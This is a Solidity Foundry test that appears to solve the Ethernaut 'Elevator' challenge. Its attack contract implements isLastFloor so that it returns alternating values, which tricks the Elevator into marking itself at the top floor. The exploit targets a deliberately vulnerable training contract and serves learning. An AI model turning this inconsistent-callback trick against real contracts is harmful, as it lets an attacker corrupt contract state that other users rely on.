// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/11_Elevator.sol";

contract ElevatorTest is Test {
    Elevator instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);
        vm.deal(player1, 10);

        instance = new Elevator();

        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        attacker.attack(11);
        assertEq(instance.top(), true);
    }
}

contract Attack is Building {
    Elevator instance;
    bool top = false;

    constructor(address fb) {
        instance = Elevator(fb);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        top = !top;
        return !top;
    }

    function attack(uint _floor) public {
        instance.goTo(_floor);
    }
}
